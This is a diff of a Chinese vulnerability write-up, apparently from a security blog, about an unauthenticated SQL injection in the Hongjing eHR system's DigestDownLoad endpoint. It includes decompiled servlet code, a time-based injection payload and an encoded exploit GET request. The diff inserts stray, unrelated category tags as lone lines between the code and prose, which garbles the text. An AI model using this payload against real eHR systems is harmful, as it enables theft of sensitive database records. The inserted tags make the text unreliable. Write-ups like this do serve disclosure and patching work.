@@ -6,9 +6,9 @@ asset_dir: embedded-base64
 
 # 漏洞简介
 
-宏景人力资源管理系统（eHR）是一款由宏景软件研发的系统。宏景人力资源管理系统的 `DigestDownLoad` 接口处存在[SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)，未经过身份认证的远程攻击者可利用此[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "标签：漏洞")执行任意SQL指令，从而窃取数据库敏感信息。
+宏景[人力资源管理系统](#)（eHR）是一款由宏景[软件](#)研发的系统。宏景人力资源管理系统的 `DigestDownLoad` 接口处存在[SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)，未经过身份认证的远程攻击者可利用此[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "标签：漏洞")执行任意SQL指令，从而窃取数据库敏感信息。
 
-数据管理
+人力资源
 
 # 影响版本
 
@@ -37,9 +37,9 @@ asset_dir: embedded-base64
 
 计算机科学
 
-书籍
+黑客与破解
 
-代理
+商务软件和生产力软件
 
 ```
 public void doGet(HttpServletRequest var1, HttpServletResponse var2) throws ServletException, IOException {
@@ -52,6 +52,8 @@ public void doGet(HttpServletRequest var1, HttpServletResponse var2) throws Serv
 ```
 
 首先规定请求方法为 GET ,获取的两个参数 id、type ，需要对 id 进行解码以及解密，可以使用DecryptTools工具或者[我写的](https://mrxn.net/jswz/714.html)直接编码加密即可，解码与解密方法如下
+
+编程
 
 ```
 public static final String decode(String var0) {
@@ -85,11 +87,11 @@ public static final String decode(String var0) {
 
 深入探索
 
-内容管理系统
+商务软件和生产力软件
 
-代理
+黑客与破解
 
-软件
+计算机科学
 
 ```
 public static String decrypt(String var0) {
@@ -113,6 +115,8 @@ public static String decrypt(String var0) {
 
 当 `var4=original` 时，执行以下处理逻辑
 
+软件
+
 ```
 var5 = var7.createStatement();
 String var12 = "";
@@ -132,6 +136,8 @@ if (var4.equalsIgnoreCase("original")) {
 # 漏洞复现
 
 [漏洞利用](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)使用 `1'waitfor delay'0:0:5'--` 加密编码后来测试
+
+网络安全
 
 ```
 GET /servlet/DigestDownLoad?id=SPAATTP~32HJFPAATTPJPAATTP~32HJFPAATTPHNvno~33W~39Sm~33WBgDEqPAATTP~32HJFPAATTPWzCGPAATTP~32HJBPAATTPS~30TBXpcPpPAATTP~32HJFPAATTP~37~39l~37h~38PAATTP~33HJDPAATTP HTTP/1.1
